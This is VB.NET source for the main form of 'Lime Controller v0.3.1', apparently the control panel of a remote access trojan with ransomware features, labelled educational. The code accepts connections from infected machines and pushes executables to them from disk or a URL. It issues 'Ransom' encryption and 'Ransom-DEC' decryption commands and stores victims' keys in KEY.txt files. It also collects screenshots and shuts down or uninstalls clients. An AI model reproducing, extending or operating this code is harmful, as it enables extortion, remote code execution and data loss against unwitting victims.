
'##################################################################
'##           N Y A N   C A T  ||  Last edit MAR./08/2018        ##
'##################################################################
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##            ░░░░░░░░░░▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄░░░░░░░░░           ##
'##            ░░░░░░░░▄▀░░░░░░░░░░░░▄░░░░░░░▀▄░░░░░░░           ##
'##            ░░░░░░░░█░░▄░░░░▄░░░░░░░░░░░░░░█░░░░░░░           ##
'##            ░░░░░░░░█░░░░░░░░░░░░▄█▄▄░░▄░░░█░▄▄▄░░░           ##
'##            ░▄▄▄▄▄░░█░░░░░░▀░░░░▀█░░▀▄░░░░░█▀▀░██░░           ##
'##            ░██▄▀██▄█░░░▄░░░░░░░██░░░░▀▀▀▀▀░░░░██░░           ##
'##            ░░▀██▄▀██░░░░░░░░▀░██▀░░░░░░░░░░░░░▀██░           ##
'##            ░░░░▀████░▀░░░░▄░░░██░░░▄█░░░░▄░▄█░░██░           ##
'##            ░░░░░░░▀█░░░░▄░░░░░██░░░░▄░░░▄░░▄░░░██░           ##
'##            ░░░░░░░▄█▄░░░░░░░░░░░▀▄░░▀▀▀▀▀▀▀▀░░▄▀░░           ##
'##            ░░░░░░█▀▀█████████▀▀▀▀████████████▀░░░░           ##
'##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
'##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
'##                                                              ##
'##                  .. Lime Controller v0.3.1 ..                ##
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##################################################################
'##    This project was created for educational purposes only    ##
'##################################################################



Public Class Form1

    Public Shared F As Form1
    Public Shared SPL As String = "'L'"
    Public Shared LIST_ITEMS As New List(Of String)
    Public Myport As Integer
    Public cc As New CL
    Private m_SortingColumn As ColumnHeader


#Region "Events"

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        TOS.ShowDialog()
        Try
            Dim box As Integer = InputBox(" Hello " & Environment.UserName + vbNewLine + vbNewLine & " Please enter port", "PORT")
            Myport = box

            Control.CheckForIllegalCrossThreadCalls = False
            F = Me
            cc.Start(Myport)
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical, Nothing)
            End
        End Try

        If Not IO.Directory.Exists(Application.StartupPath + "\Stub") Then
            IO.Directory.CreateDirectory(Application.StartupPath + "\Stub")
        End If

        Me.Text = "Lime Controller v0.3.1"

        Fix()

    End Sub

    Private Sub Form1_Closing(sender As Object, e As System.ComponentModel.CancelEventArgs) Handles MyBase.Closing
        On Error Resume Next
        End
    End Sub

#End Region

#Region "receiving"
    Delegate Sub _DT(ByVal C As C, ByVal B() As Byte)
    Shared Sub DT(ByVal C As C, ByVal B() As Byte)

        Dim A() As String = Strings.Split(FN.GS(B), SPL)
        On Error Resume Next
        Select Case A(0)
            Case "INFO"

                Threading.Monitor.Enter(F.L1.Items)
                For I As Integer = 0 To A.Count - 1
                    LIST_ITEMS.Add(A(I))
                Next


                C.L = F.L1.Items.Add(LIST_ITEMS(1))
                C.L.SubItems.Add(C.ip)
                C.L.SubItems.Add(LIST_ITEMS(2))
                C.L.SubItems.Add(LIST_ITEMS(3))
                C.L.SubItems.Add(LIST_ITEMS(4))
                C.L.SubItems.Add(LIST_ITEMS(5))
                C.L.SubItems.Add(LIST_ITEMS(6))
                C.L.SubItems.Add(LIST_ITEMS(7))
                C.L.SubItems.Add(LIST_ITEMS(8))
                C.L.SubItems.Add(LIST_ITEMS(9))
                C.L.SubItems.Add(LIST_ITEMS(10))

                C.L.Tag = C
                LIST_ITEMS.Clear()
                Threading.Monitor.Exit(F.L1.Items)
                Fix()
                Return

            Case "MSG"
                For Each L As ListViewItem In F.L1.Items
                    If L.SubItems(1).Text = C.ip Then
                        F.L2.Items.Add(DateAndTime.Now.ToString("dd/MMM hh:mm tt") + "  " + L.SubItems(0).Text + "  " + L.SubItems(2).Text + "  -->>  " + A(1).ToString)
                        Exit For
                    End If
                Next


            Case "Details"

                If F.InvokeRequired Then
                    F.Invoke(New _DT(AddressOf DT), C, B)
                    Exit Sub
                End If

                Dim D As Details = My.Application.OpenForms("Details" & C.ip)
                If D Is Nothing Then
                    D = New Details
                    D.Name = "Details" + C.ip
                    D.F = F
                    D.C = C
                    D.Show()
                End If

                D.ListView1.Clear()

                D.ListView1.Columns.Add("")
                D.ListView1.Columns.Add("")

                D.ListView1.Items.Add("ID").SubItems.Add(A(1))
                D.ListView1.Items.Add("User").SubItems.Add(A(2))
                D.ListView1.Items.Add("Current Connection").SubItems.Add(A(11))
                D.ListView1.Items.Add("Stub").SubItems.Add(A(3))
                D.ListView1.Items.Add("CPU").SubItems.Add(A(4))
                D.ListView1.Items.Add("GPU").SubItems.Add(A(5))
                D.ListView1.Items.Add("Privilege").SubItems.Add(A(6))
                D.ListView1.Items.Add("Machine Type").SubItems.Add(A(7))
                D.ListView1.Items.Add("Current Time").SubItems.Add(A(8))
                D.ListView1.Items.Add("Drivers List").SubItems.Add(A(9))
                D.ListView1.Items.Add("Last reboot").SubItems.Add(A(10))
                D.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)

            Case "Processes"
                Dim D As Details = My.Application.OpenForms("Details" & C.ip)

                For i As Integer = 1 To A.Length - 1
                    Dim x As String() = Split(A(i), "|LIME|")
                    D.ListView2.Items.Add(x(0)).SubItems.Add(x(1))
                Next
                D.ListView2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)

            Case "GET-PASS"
                If Not IO.Directory.Exists("Users" & "\" & A(1)) Then
                    IO.Directory.CreateDirectory("Users" & "\" & A(1))
                End If
                IO.File.WriteAllText("Users" & "\" & A(1) + "\" & "KEY.txt", A(2))

            Case "DEL-PASS"
                IO.File.Delete("Users" & "\" & A(1) + "\" & "KEY.txt")

            Case "c_ransome"
                C.L.SubItems(3).Text = A(1)
                Fix()

            Case "SC"
                IO.File.WriteAllBytes("Users" & "\" & A(1) + "\" & "SC.jpeg", Convert.FromBase64String(A(2)))
                Process.Start("Users" & "\" & A(1) + "\" & "SC.jpeg")



        End Select

    End Sub
#End Region

#Region "Sending"

    Private Sub FromDiskToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FromDiskToolStripMenuItem1.Click

        Try
            Dim o As New OpenFileDialog
            With o
                .Filter = "All Type (*.*)|*.*"
                .Title = "Select a File"
            End With

            If o.ShowDialog = Windows.Forms.DialogResult.OK Then
                For Each l As ListViewItem In Me.L1.SelectedItems
                    Dim C As C = CType(l.Tag, C)
                    C.SendText("RunDisk" & SPL & o.FileName & SPL & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
                Next
            End If
        Catch ex As Exception
        End Try

    End Sub


    Private Sub FromURLToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FromURLToolStripMenuItem1.Click
        Try
            Dim URL As String = InputBox("Enter the direct link", "Run File", "http://site.com/file.exe")
            If String.IsNullOrEmpty(URL) Then
                Exit Sub
            Else
                For Each l As ListViewItem In Me.L1.SelectedItems
                    Dim C As C = CType(l.Tag, C)
                    C.SendText("RunURL" & SPL & URL)
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub FromDiskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromDiskToolStripMenuItem.Click
        Try
            Dim o As New OpenFileDialog
            With o
                .Filter = ".exe (*.exe)|*.exe"
                .Title = "UPDATE"
            End With

            If o.ShowDialog = Windows.Forms.DialogResult.OK Then
                For Each l As ListViewItem In Me.L1.SelectedItems
                    Dim C As C = CType(l.Tag, C)
                    C.SendText("RunDisk" & SPL & o.FileName & SPL & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)) & SPL & "update")
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub FromURLToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromURLToolStripMenuItem.Click
        Try
            Dim URL As String = InputBox("Enter the direct link", "UPDATE", "http://site.com/file.exe")
            If String.IsNullOrEmpty(URL) Then

                Exit Sub
            Else
                For Each l As ListViewItem In Me.L1.SelectedItems
                    Dim C As C = CType(l.Tag, C)
                    C.SendText("RunURL" & SPL & URL & SPL & "update")
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub RestartToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RestartToolStripMenuItem1.Click
        For Each l As ListViewItem In Me.L1.SelectedItems
            Dim C As C = CType(l.Tag, C)
            C.SendText("Reconnect")
        Next
    End Sub

    Private Sub UninstallToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UninstallToolStripMenuItem1.Click
        For Each l As ListViewItem In Me.L1.SelectedItems
            Dim C As C = CType(l.Tag, C)
            C.SendText("Uni")
        Next
    End Sub

    Private Sub CloseToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CloseToolStripMenuItem.Click
        For Each l As ListViewItem In Me.L1.SelectedItems
            Dim C As C = CType(l.Tag, C)
            C.SendText("Close")
        Next
    End Sub

    Private Sub LogoffToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles LogoffToolStripMenuItem.Click
        For Each l As ListViewItem In Me.L1.SelectedItems
            Dim C As C = CType(l.Tag, C)
            C.SendText("Logoff")
        Next
    End Sub

    Private Sub ToolStripMenuItem3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem3.Click
        For Each l As ListViewItem In Me.L1.SelectedItems
            Dim C As C = CType(l.Tag, C)
            C.SendText("Restart")
        Next
    End Sub

    Private Sub ShutdownToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ShutdownToolStripMenuItem.Click
        For Each l As ListViewItem In Me.L1.SelectedItems
            Dim C As C = CType(l.Tag, C)
            C.SendText("Shutdown")
        Next
    End Sub

    Private Sub DetailsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DetailsToolStripMenuItem.Click
        For Each l As ListViewItem In Me.L1.SelectedItems
            Dim C As C = CType(l.Tag, C)
            C.SendText("Details")
        Next
    End Sub

    Private Sub EncryptToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EncryptToolStripMenuItem.Click
        Try
            Dim R As New Ransomware
            R.ShowDialog()

            If R.OK = True Then

                For Each l As ListViewItem In Me.L1.SelectedItems
                    Dim C As C = CType(l.Tag, C)
                    C.SendText("Ransom" + SPL + R.RichTextBox1.Text + SPL + Convert.ToBase64String(IO.File.ReadAllBytes(R.o.FileName)))

                Next
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub DecryptToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DecryptToolStripMenuItem.Click
        Try
            For Each l As ListViewItem In Me.L1.SelectedItems
                Dim C As C = CType(l.Tag, C)
                C.SendText("Ransom-DEC" + SPL + IO.File.ReadAllText("USERS" + "\" + C.L.SubItems(0).Text + "\Key.txt"))
            Next
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub VisitWebsiteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles VisitWebsiteToolStripMenuItem.Click
        Dim URL As String = InputBox("", "Visit Website", "https://google.com")
        For Each l As ListViewItem In Me.L1.SelectedItems
            Dim C As C = CType(l.Tag, C)
            C.SendText("VisitURL" + SPL + URL)
        Next
    End Sub


#End Region

#Region "Theme"

    Private Shared Sub Fix()
        F.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
    End Sub

    Private Sub ListView1_Resize(sender As Object, e As EventArgs)
        Fix()
    End Sub

    Public Function KeyCount()
        Try
            Dim Location = Application.StartupPath + "\Users"
            Dim fileEntries As String() = IO.Directory.GetFiles(Location, "KEY.txt", IO.SearchOption.AllDirectories)
            Return fileEntries.Count
        Catch ex As Exception
            Return "0"
        End Try
    End Function

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Me.ToolStripStatusLabel1.Text = "LISTENING PORT [" & Myport & "]        ONLINE CLIENTS [" & L1.Items.Count & "]        SELECTED CLIENTS [" & L1.SelectedItems.Count & "]        AVAILABLE KEYS TO DECRYPT [" & KeyCount() & "]"
    End Sub

    Private Sub Form1_Activated(sender As Object, e As EventArgs) Handles Me.Activated
        Opacity = 1
    End Sub

    Private Sub Form1_Deactivate(sender As Object, e As EventArgs) Handles Me.Deactivate
        Opacity = 0.8
    End Sub

    Private Sub AboutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AboutToolStripMenuItem.Click
        MsgBox("Coded by : NYAN CAT")
    End Sub

    Private Sub BuilderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BuilderToolStripMenuItem.Click
        Builder.Show()
    End Sub

    Private Sub L1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles L1.SelectedIndexChanged
        Dim x As Integer
        Try
            If L1.SelectedItems.Count > 0 Then
                For x = 0 To L1.SelectedItems.Count - 1
                    PictureBox1.ImageLocation = "Users" & "\" & L1.SelectedItems(x).Text + "\" & "SC.jpeg"
                    PictureBox1.SizeMode = PictureBoxSizeMode.StretchImage
                    PictureBox1.Visible = True
                Next
            Else
                PictureBox1.Visible = False
            End If
        Catch ex As Exception
            PictureBox1.Visible = False
        End Try
    End Sub

    Class ListViewComparer
        Implements IComparer

        Private m_ColumnNumber As Integer
        Private m_SortOrder As SortOrder

        Public Sub New(ByVal column_number As Integer, ByVal _
            sort_order As SortOrder)
            m_ColumnNumber = column_number
            m_SortOrder = sort_order
        End Sub

        ' Compare the items in the appropriate column
        ' for objects x and y.
        Public Function Compare(ByVal x As Object, ByVal y As _
            Object) As Integer Implements _
            System.Collections.IComparer.Compare
            Dim item_x As ListViewItem = DirectCast(x,
                ListViewItem)
            Dim item_y As ListViewItem = DirectCast(y,
                ListViewItem)

            ' Get the sub-item values.
            Dim string_x As String
            If item_x.SubItems.Count <= m_ColumnNumber Then
                string_x = ""
            Else
                string_x = item_x.SubItems(m_ColumnNumber).Text
            End If

            Dim string_y As String
            If item_y.SubItems.Count <= m_ColumnNumber Then
                string_y = ""
            Else
                string_y = item_y.SubItems(m_ColumnNumber).Text
            End If

            ' Compare them.
            If m_SortOrder = SortOrder.Ascending Then
                If IsNumeric(string_x) And IsNumeric(string_y) _
                    Then
                    Return Val(string_x).CompareTo(Val(string_y))
                ElseIf IsDate(string_x) And IsDate(string_y) _
                    Then
                    Return DateTime.Parse(string_x).CompareTo(DateTime.Parse(string_y))
                Else
                    Return String.Compare(string_x, string_y)
                End If
            Else
                If IsNumeric(string_x) And IsNumeric(string_y) _
                    Then
                    Return Val(string_y).CompareTo(Val(string_x))
                ElseIf IsDate(string_x) And IsDate(string_y) _
                    Then
                    Return DateTime.Parse(string_y).CompareTo(DateTime.Parse(string_x))
                Else
                    Return String.Compare(string_y, string_x)
                End If
            End If
        End Function
    End Class

    Private Sub L1_ColumnClick(ByVal sender As System.Object, ByVal e As ColumnClickEventArgs) Handles L1.ColumnClick
        ' Get the new sorting column.
        Dim new_sorting_column As ColumnHeader = L1.Columns(e.Column)

        ' Figure out the new sorting order.
        Dim sort_order As System.Windows.Forms.SortOrder
        If m_SortingColumn Is Nothing Then
            ' New column. Sort ascending.
            sort_order = SortOrder.Ascending
        Else
            ' See if this is the same column.
            If new_sorting_column.Equals(m_SortingColumn) Then
                ' Same column. Switch the sort order.
                If m_SortingColumn.Text.StartsWith("> ") Then
                    sort_order = SortOrder.Descending
                Else
                    sort_order = SortOrder.Ascending
                End If
            Else
                ' New column. Sort ascending.
                sort_order = SortOrder.Ascending
            End If

            ' Remove the old sort indicator.
            m_SortingColumn.Text =
                m_SortingColumn.Text.Substring(2)
        End If

        ' Display the new sort order.
        m_SortingColumn = new_sorting_column
        If sort_order = SortOrder.Ascending Then
            m_SortingColumn.Text = "> " & m_SortingColumn.Text
        Else
            m_SortingColumn.Text = "< " & m_SortingColumn.Text
        End If

        ' Create a comparer.
        L1.ListViewItemSorter = New ListViewComparer(e.Column, sort_order)

        ' Sort.
        L1.Sort()
        Fix()
    End Sub





#End Region


End Class
